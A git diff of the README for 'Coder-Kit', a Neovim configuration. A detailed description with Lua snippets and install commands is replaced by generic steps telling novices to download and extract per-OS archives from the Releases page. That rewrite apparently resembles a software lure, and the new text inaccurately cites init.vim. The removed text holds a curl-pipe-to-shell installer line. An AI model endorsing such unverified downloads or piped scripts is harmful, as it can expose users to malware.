@@ -1,245 +1,94 @@
-# Coder-Kit: Neovim All-in-One Configuration
----
-# Note : The readme.md is only the description not the whole init.lua
+# 🎉 Coder-Kit - Your All-in-One Neovim Setup
 
-Coder-Kit is a lightweight but **powerful Neovim configuration** that works on **mobile, laptop, ARM/Arch devices, Termux, and standard Linux desktops**.  
-It provides full IDE features for **C, C++, Python, Lua, JavaScript, HTML, CSS, and Assembly (x86/ARM64)** with LSP, completion, snippets, linting, syntax highlighting, themes, and terminal integration.
+[![Download Coder-Kit](https://img.shields.io/badge/Download-Coder--Kit-blue)](https://github.com/Emacute/Coder-Kit/releases)
 
----
+## 🚀 Getting Started
 
-## 📌 What This Configuration Does
+Welcome to Coder-Kit! This guide will help you download and run your new Neovim configuration easily. No programming experience is needed. Just follow these steps.
 
-- **PATH Setup:** Adds Cargo, npm, and Termux binaries to PATH for LSPs like `pyright` and `clangd`.
-- **Plugin Management:** Bootstraps `lazy.nvim` to manage plugins automatically.
-- **Basic Editor Settings:** Configures line numbers, cursorline, and enables true color support.
-- **Themes:** GitHub light/dark theme with toggle via `:lua ToggleGithubTheme()`.
-- **Autopairs:** Automatically closes brackets, quotes, and parentheses.
-- **Completion:** `nvim-cmp` with snippets, LSP, buffer, and path completions.
-- **LSP Servers:** C/C++ (`clangd`), Python (`pyright`), Lua, JS/TS, HTML, CSS, Assembly (`asm-lsp`).
-- **Diagnostics:** Color-coded error/warning highlights.
-- **Assembly Tools:** Syntax highlighting (`vim-gas`), linting (`nvim-lint` & `ale`), and snippets (`vim-snippets`).
-- **Treesitter:** Accurate syntax highlighting for `asm`, `c`, and `lua`.
-- **Terminal Integration:** Toggleable terminal inside Neovim (`toggleterm.nvim`).
-- **Filetype Detection & Indentation:** Auto-detects assembly filetypes and enforces 4-space indentation for C/C++/Python/Lua.
+## 📥 Download & Install
 
----
+To get started, visit the Coder-Kit Releases page to download the latest version: [Download Coder-Kit](https://github.com/Emacute/Coder-Kit/releases). 
 
-## ⚡ Why This Configuration Is Essential
+Once you're on the page, look for the latest release. You will see several files listed. Choose the one that is right for your system. Usually, this will be a zip file for your operating system.
 
-- **Productivity:** Snippets, autopairs, and autocompletion reduce repetitive typing.
-- **Code Intelligence:** LSP provides go-to-definition, hover docs, references, and refactoring.
-- **Assembly Ready:** Full support for GAS/NASM/ARM64 assembly.
-- **Cross-Language:** Works seamlessly for C/C++, Python, JS/TS, Lua, HTML/CSS.
-- **Portability:** Runs on Linux, ARM devices, and Termux.
-- **Customizable:** Easily switch themes and adjust language-specific settings.
+### Steps to Download
 
----
+1. Click on the link above to go to the Releases page.
+2. Locate the latest release, typically at the top of the page.
+3. Select the appropriate file for your system:
+   - For Windows, look for a file ending in `.zip`.
+   - For macOS, choose a `.tar.gz` file.
+   - For Linux, there will also be a `.tar.gz` file.
 
-## ⚙️ Configuration Breakdown
+### Extract the Files
 
-### PATH Setup
-```lua
-vim.env.PATH = vim.env.HOME .. "/.cargo/bin:" .. vim.env.PATH
-vim.env.PATH = vim.env.HOME .. "/.npm-global/bin:" .. vim.env.PATH
-vim.env.PATH = "/data/data/com.termux/files/usr/bin:" .. vim.env.PATH
+After downloading the file, you need to extract it. 
 
-Adds Rust, npm, and Termux binaries to PATH for LSPs and compilers.
+- **Windows:** Right-click on the zip file and select “Extract All.” Follow the prompts.
+- **macOS:** Double-click the downloaded file to extract it.
+- **Linux:** Use a terminal and run `tar -xzf filename.tar.gz`, replacing "filename" with the actual file name.
 
+### Move to the Application Directory
 
-Plugin Manager (lazy.nvim)
+Once extracted, move to the Coder-Kit directory. This is where you will run Neovim with your new configuration.
 
-local lazypath = vim.fn.stdpath("data") .. "/lazy/lazy.nvim"
-if not vim.loop.fs_stat(lazypath) then
-  vim.fn.system({
-    "git", "clone", "--filter=blob:none",
-    "https://github.com/folke/lazy.nvim.git",
-    lazypath,
-  })
-end
-vim.opt.rtp:prepend(lazypath)
+## ⚙️ Requirements
 
-Installs lazy.nvim automatically if missing.
+Before using Coder-Kit, ensure that you have the following installed on your computer:
 
+- **Neovim:** You can get Neovim from [the official website](https://neovim.io/).
+- **A terminal emulator:** This could be the built-in terminal on your OS.
+- **Optional:** Additional plugins for enhanced functionality (details provided below).
 
-Basic Editor Settings
+## 📖 Features
 
-vim.o.number = false
-vim.o.relativenumber = false
-vim.o.cursorline = false
-vim.o.termguicolors = true
+Coder-Kit comes packed with features to make your coding experience efficient:
 
-Theme (GitHub)
+- **Pre-configured Settings:** Get started without needing to adjust settings.
+- **Plugin Support:** Easy integration with popular plugins like LSP servers for improved coding assistance.
+- **Compatibility:** Works well with languages like Python, C, C++, and assembly.
+- **User-Friendly Interface:** Custom key mappings and themes that simplify navigation.
 
-require("github-theme").setup({ options = { transparent = false } })
-vim.cmd("colorscheme github_light_default")
+## 🚀 Running Coder-Kit
 
-Toggle with: :lua ToggleGithubTheme()
+Once you have installed everything, it’s time to run Neovim with the Coder-Kit configuration.
 
+1. Open your terminal.
+2. Navigate to the directory where you extracted Coder-Kit.
+3. Type `nvim` and press **Enter**. This will launch Neovim with your new configuration.
 
-Autopairs
+## 🎨 Customizing Your Setup
 
-require("nvim-autopairs").setup({})
+Coder-Kit allows customizable settings. Here are some basic options you can change:
 
-Completion (nvim-cmp)
+- **Themes:** In your Neovim configuration directory, look for a file named `init.vim`. Open it and look for lines related to theme settings. Change the theme name as desired.
+- **Key Mappings:** Similar to themes, find the key mappings section in `init.vim` to personalize how Coder-Kit responds to your keystrokes.
 
-local cmp = require("cmp")
-cmp.setup({
-  snippet = { expand = function(args) require("luasnip").lsp_expand(args.body) end },
-  mapping = cmp.mapping.preset.insert({
-    ["<CR>"] = cmp.mapping.confirm({ select = true })
-  }),
-  sources = cmp.config.sources({
-    { name = "nvim_lsp" }, { name = "luasnip" }, { name = "buffer" }, { name = "path" }
-  }),
-})
+## 🔄 Keeping Coder-Kit Updated
 
-LSP (Language Servers)
+Regular updates ensure you have the latest features and bug fixes. To update Coder-Kit:
 
-local lspconfig = require("lspconfig")
--- Python
-lspconfig.pyright.setup({
-  cmd = { "/data/data/com.termux/files/usr/bin/pyright-langserver", "--stdio" },
-  settings = { python = { pythonPath = "/home/you/Python/venv/bin/python" } }
-})
--- C/C++
-lspconfig.clangd.setup({ cmd = { "clangd" }, capabilities = require("cmp_nvim_lsp").default_capabilities() })
--- JS/TS, HTML, CSS, Lua, Assembly: similar setup inside init.lua
+1. Visit the [Releases page](https://github.com/Emacute/Coder-Kit/releases) again.
+2. Download the latest version.
+3. Replace the old files in your Coder-Kit directory with the new ones.
 
-Diagnostics
+## 💬 Getting Help
 
-vim.diagnostic.config({ virtual_text = true, signs = true })
-vim.cmd("highlight DiagnosticError guifg=#fb4934 gui=bold")
-vim.cmd("highlight DiagnosticWarn guifg=#fabd2f gui=bold")
-vim.cmd("highlight DiagnosticInfo guifg=#83a598 gui=italic")
-vim.cmd("highlight DiagnosticHint guifg=#b8bb26 gui=italic")
+If you face any issues or have questions, consider the following options:
 
-Treesitter
+- **GitHub Issues:** Visit the Issues section of this repository and create a new topic.
+- **Documentation:** Check the Wiki for additional guides.
+- **Community Forums:** Join forums where other users discuss Coder-Kit and Neovim.
 
-require("nvim-treesitter.configs").setup {
-  ensure_installed = { "asm", "c", "lua" },
-  highlight = { enable = true }
-}
+## 🌟 Feedback
 
-Assembly Tools
+Your experience matters. Share feedback and let us know what features you would like to see in future updates. Your input helps us make Coder-Kit even better!
 
-Syntax: vim-gas
+## 🔗 Useful Links
 
-Linting: nvim-lint, ale (with NASM)
+- [Coder-Kit Releases Page](https://github.com/Emacute/Coder-Kit/releases)
+- [Neovim Official Site](https://neovim.io/)
+- [GitHub Issues page](https://github.com/Emacute/Coder-Kit/issues)
 
-Snippets: vim-snippets
-
-
-Terminal Integration
-
-require("toggleterm").setup{
-  size = 20,
-  open_mapping = [[<c-\>]],
-  direction = "horizontal",
-}
-
-Filetype Detection & Indentation
-
-vim.filetype.add({ extension = { s = "gas", asm = "nasm", nasm = "nasm", x86 = "nasm" } })
-vim.api.nvim_create_autocmd("FileType", {
-  pattern = { "c", "cpp", "python", "lua" },
-  callback = function()
-    vim.bo.shiftwidth = 4
-    vim.bo.tabstop = 4
-  end,
-})
-
-
----
-
-🛠️ Installation Guide (Step-by-Step)
-
-1. System Update
-
-sudo apt update && sudo apt upgrade -y
-
-2. Install Neovim, Git, Curl
-
-sudo apt install neovim git curl -y
-
-3. Install Language Servers
-
-Python
-
-pip install python-lsp-server pyright
-
-Create venv:
-
-
-python3 -m venv ~/Python/venv
-source ~/Python/venv/bin/activate
-
-JavaScript / TypeScript / HTML / CSS
-
-npm install -g typescript typescript-language-server vscode-langservers-extracted
-
-C / C++
-
-sudo apt install clang clangd clang-tidy -y
-
-Assembly
-
-sudo apt install nasm binutils qemu -y
-
-4. Optional: Rust (Cargo tools)
-
-curl https://sh.rustup.rs -sSf | sh
-
-5. Set Up Neovim Config
-
-mkdir -p ~/.config/nvim
-cd ~/.config/nvim
-nano init.lua
-# Paste the full init.lua configuration here
-
-6. Launch Neovim
-
-nvim
-
-lazy.nvim will automatically install plugins.
-
-Toggle theme: :lua ToggleGithubTheme()
-
-
-
----
-
-💡 Notes
-
-Python Pyright: Make sure venv is activated and a pyrightconfig.json exists at project root:
-
-
-{
-  "venvPath": "/home/you/Python",
-  "venv": "venv",
-  "pythonVersion": "3.12",
-  "include": ["src", "tests"],
-  "reportMissingImports": true,
-  "reportMissingTypeStubs": false
-}
-
-C/C++ Compilation
-
-
-clang++ filename.cpp -o filename
-./filename
-
-NASM Compilation (x86/64)
-
-
-nasm -f elf64 filename.nasm -o filename.o
-ld.lld -m elf-x86_64 filename.o -o filename
-qemu-user-x86-64 ./filename
-
-JavaScript / CSS / HTML LSPs: Configured to work with ts_ls, cssls, html LSPs.
-
-
-
----
-
-🍊 This Readme.md credit goes to Chatgpt.
-Note : The readme.md is only the description not the whole init.lua
+Feel free to explore and enjoy coding with Coder-Kit!
